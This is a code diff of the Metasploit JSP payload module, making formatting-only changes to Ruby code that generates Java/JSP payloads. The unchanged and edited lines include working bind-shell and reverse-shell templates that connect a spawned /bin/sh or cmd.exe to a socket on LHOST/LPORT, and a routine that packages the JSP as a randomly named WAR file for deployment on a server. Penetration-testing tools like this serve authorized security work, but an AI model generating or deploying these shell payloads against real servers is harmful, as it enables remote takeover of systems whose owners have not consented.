@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 # -*- coding: binary -*-
 require 'msf/core'
 require 'rex'
@@ -5,14 +6,13 @@ require 'rex'
 # This module is chained within JSP payloads that target the Java platform.
 # It provides methods to generate Java / JSP code.
 module Msf::Payload::JSP
-
   # @param [Hash<Symbol, [String, nil]>] info
   def initialize(info = {})
     ret = super(info)
 
     register_options([
-      Msf::OptString.new( 'SHELL', [false, 'The system shell to use.'])
-    ], Msf::Payload::JSP )
+                       Msf::OptString.new('SHELL', [false, 'The system shell to use.'])
+                     ], Msf::Payload::JSP)
 
     ret
   end
@@ -75,7 +75,7 @@ module Msf::Payload::JSP
   try
   {
     #{shell_path}
-    ServerSocket server_socket = new ServerSocket( #{datastore['LPORT'].to_s} );
+    ServerSocket server_socket = new ServerSocket( #{datastore['LPORT']} );
     Socket client_socket = server_socket.accept();
     server_socket.close();
     Process process = Runtime.getRuntime().exec( ShellPath );
@@ -146,7 +146,7 @@ module Msf::Payload::JSP
   try
   {
     #{shell_path}
-    Socket socket = new Socket( "#{datastore['LHOST']}", #{datastore['LPORT'].to_s} );
+    Socket socket = new Socket( "#{datastore['LHOST']}", #{datastore['LPORT']} );
     Process process = Runtime.getRuntime().exec( ShellPath );
     ( new StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();
     ( new StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();
@@ -161,7 +161,7 @@ module Msf::Payload::JSP
   #
   # @return [Rex::Zip::Jar] a war to execute the jsp payload
   def generate_war
-    jsp_name = "#{Rex::Text.rand_text_alpha_lower(rand(8)+8)}.jsp"
+    jsp_name = "#{Rex::Text.rand_text_alpha_lower(rand(8) + 8)}.jsp"
 
     zip = Rex::Zip::Jar.new
 
@@ -191,10 +191,10 @@ module Msf::Payload::JSP
   #
   # @return [String] the Java code.
   def shell_path
-    if datastore['SHELL'] && !datastore['SHELL'].empty?
-      jsp =  "String ShellPath = \"#{datastore['SHELL']}\";"
-    else
-      jsp = <<-EOS
+    jsp = if datastore['SHELL'] && !datastore['SHELL'].empty?
+            "String ShellPath = \"#{datastore['SHELL']}\";"
+          else
+            <<-EOS
 String ShellPath;
 if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1) {
   ShellPath = new String("/bin/sh");
@@ -202,9 +202,8 @@ if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1) {
   ShellPath = new String("cmd.exe");
 }
       EOS
-    end
+          end
 
     jsp
   end
-
 end
